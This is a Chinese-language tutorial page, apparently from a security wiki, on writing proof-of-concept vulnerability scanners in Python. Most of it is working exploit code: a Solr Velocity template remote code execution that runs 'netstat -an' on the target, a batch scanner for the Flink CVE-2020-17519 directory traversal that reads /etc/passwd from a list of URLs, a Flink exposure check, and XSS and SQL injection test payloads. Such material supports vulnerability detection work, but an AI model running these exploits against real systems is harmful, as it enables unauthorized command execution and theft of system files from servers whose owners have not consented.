# POC编写相关

 POC编写的相关内容如下：

{% tabs %}
{% tab title="单次请求" %}
代码如下

```python
#coding:utf-8
#https://twitter.com/jas502n/status/1193869996717297664
import urllib2
import ssl

class Pocscan(object):
	def __init__(self, target):
		self.result = {
			"status":False,
			"target":target,
		}
	def verify(self):
		url = self.result['target'] + '/overview'
		headers = {
			"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		}
		# ssl._create_default_https_context = ssl._create_unverified_context
		try:
			req = urllib2.Request(url,headers=headers)
			rsp = urllib2.urlopen(req,timeout=8)
			text = rsp.read()
			if '"taskmanagers"' in text and 'flink-version' in text:
				self.result['status'] = True
				self.result['target'] = url
				self.result['method'] = 'GET'
				self.result['response'] = 'flink-version'
		except Exception as e:
			self.result['info'] = str(e)
		return self.result
```
{% endtab %}

{% tab title="多次请求" %}
代码如下

```python
#coding:utf-8
#https://www.anquanke.com/post/id/190039
import urllib2
import ssl
import re

class Pocscan(object):
	def __init__(self, target):
		self.result = {
			"status":False,
			"target":target,
		}
	def verify(self):
		headers = {
			"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		}
		ssl._create_default_https_context = ssl._create_unverified_context
		try:
			url_core = self.result['target'].rstrip('/') + '/solr/admin/cores?indexInfo=false&wt=json'
			req = urllib2.Request(url_core,headers=headers)
			rsp = urllib2.urlopen(req,timeout=8)
			text = rsp.read()
			res = re.search(r'"instanceDir":"(.*?)",',text)
			if res == None:
				return self.result
			else:
				core = res.group(1).split('\\')[-1]
				url_config = self.result['target'].rstrip('/') + '/solr/%s/config'%(core)
				headers1 = {
					"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
					"Content-Type": "application/json"
				}
				data = '''
				{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}'''
				req = urllib2.Request(url_config,headers=headers1,data=data)
				rsp = urllib2.urlopen(req,timeout=8)
				url = self.result['target'].rstrip('/') + '/solr/{0}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27netstat%20-an%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'.format(core)
				req = urllib2.Request(url,headers=headers)
				rsp = urllib2.urlopen(req,timeout=8)
				text = rsp.read()
				if 'LISTEN' in text and 'ESTABLISHED' in text:
					self.result['status'] = True
		except Exception as e:
			self.result['info'] = str(e)
		return self.result
```
{% endtab %}

{% tab title="改批量" %}
相关代码如下：

```python
#!/usr/bin/env python
# coding:utf-8
# author:Yxuan
#affected versions are Apache Flink 1.11.0-1.11.2

import requests,sys,colorama
from colorama import *
init(autoreset=True)


banner='''\033[1;33;40m
  _______      ________    ___   ___ ___   ___        __ ______ _____ __  ___  
 / ____\ \    / /  ____|  |__ \ / _ \__ \ / _ \      /_ |____  | ____/_ |/ _ \ 
| |     \ \  / /| |__ ______ ) | | | | ) | | | |______| |   / /| |__  | | (_) |
| |      \ \/ / |  __|______/ /| | | |/ /| | | |______| |  / / |___ \ | |\__, |
| |____   \  /  | |____    / /_| |_| / /_| |_| |      | | / /   ___) || |  / / 
 \_____|   \/   |______|  |____|\___/____|\___/       |_|/_/   |____/ |_| /_/                                                                                                                                                 
'''


def verify():
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
	payload= '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd' 
	poc=urls+payload
	try:
		requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
		response=requests.get(poc,headers=headers,timeout=15,verify=False)
		if response.status_code==200 and "root:x" in response.content:
			print(u'\033[1;31;40m[+]{} is apache flink directory traversal vulnerability'.format(urls))
			print(response.content)
			#将漏洞地址输出在Vul.txt中
			f=open('./vul.txt','a')
			f.write(urls)
			f.write('\n')
		else:
			print('\033[1;32;40m[-]{} None'.format(urls))
	except:
		print('{} request timeout'.format(urls))


if __name__ == '__main__':
	print (banner)
	if len(sys.argv)!=2:
		print('Example:python CVE-2020-17519.py urls.txt')
	else:
		file = open(sys.argv[1])
		for url in file.readlines():
			urls=url.strip()
			if urls[-1]=='/':
				urls=urls[:-1]
			verify()
		print ('Check Over')
```
{% endtab %}
{% endtabs %}

对于不同种类的漏洞，最好是有不同的检测方式，例如xray中采用了随机数值的方式检测SQL注入与XSS，那么使用随机数版本的漏扫脚本大概就是这样的：

{% tabs %}
{% tab title="Python" %}
随机数版本所需代码如下：

```python
# -*- coding: utf-8 -*-
import random
import string
import hashlib

# gongji = ''.join(random.sample(string.ascii_letters + string.digits, 6))

shuzhi = random.randint(0,999999)
yuju = str(shuzhi)
# ------ xss ------

xss = "<script>alert(%s)</script>" % yuju
xss = "<script>alert(" + yuju + ")</script>"

# ------ sqli ------

sqli = hashlib.md5(yuju).hexdigest()
```
{% endtab %}
{% endtabs %}

